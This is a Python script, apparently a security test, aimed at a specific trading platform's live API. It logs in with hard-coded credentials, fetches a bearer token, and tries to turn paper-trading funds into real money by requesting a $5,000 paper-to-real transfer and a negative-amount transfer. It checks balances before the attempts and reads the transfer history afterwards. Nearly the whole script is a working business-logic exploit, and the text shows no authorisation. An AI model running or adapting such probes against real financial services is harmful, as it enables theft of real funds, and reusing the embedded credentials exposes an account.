import requests
import json

BASE_URL = "https://lpadmin.blackfx.com"
TEST_USER = "mamf86@mailinator.com"
PWD = "12345678"

s = requests.Session()
s.post(f"{BASE_URL}/api/auth/login", json={"email": TEST_USER, "password": PWD})
tok = s.post(f"{BASE_URL}/api/auth/chart-token").json().get("token")
h = {"Authorization": f"Bearer {tok}", "Content-Type": "application/json"}

print("=" * 70)
print("AUDITING INTERNAL TRANSFERS: PAPER TO REAL EXPLOITATION PROBE")
print("=" * 70)

# Check funds before
r_real_b4 = s.get(f"{BASE_URL}/v1/oms/real/funds", headers=h)
r_paper_b4 = s.get(f"{BASE_URL}/v1/oms/paper/funds", headers=h)
print("Real Balance Before:", r_real_b4.json().get("funds", {}).get("balance"))
print("Paper Balance Before:", r_paper_b4.json().get("funds", {}).get("balance"))

# Test 1: Attempt transfer from PAPER to REAL
print("\n--- TEST 1: Attempting Transfer from PAPER to REAL ($5,000) ---")
r_p2r = s.post(f"{BASE_URL}/v1/oms/real/portal/transfers", headers=h, json={
    "from_account": "paper",
    "to_account": "real",
    "amount": 5000.0
})
print("Paper to Real Status:", r_p2r.status_code)
print("Paper to Real Body:", r_p2r.text)

# Test 2: Attempt transfer with negative amount
print("\n--- TEST 2: Attempting Transfer with Negative Amount (-$1,000) ---")
r_neg_tr = s.post(f"{BASE_URL}/v1/oms/real/portal/transfers", headers=h, json={
    "from_account": "real",
    "to_account": "paper",
    "amount": -1000.0
})
print("Negative Transfer Status:", r_neg_tr.status_code)
print("Negative Transfer Body:", r_neg_tr.text)

# Test 3: Check transfer history
r_hist = s.get(f"{BASE_URL}/v1/oms/real/portal/transfers", headers=h)
print("\nTransfer History:", r_hist.status_code, r_hist.text)

print("\nAudit completed.")
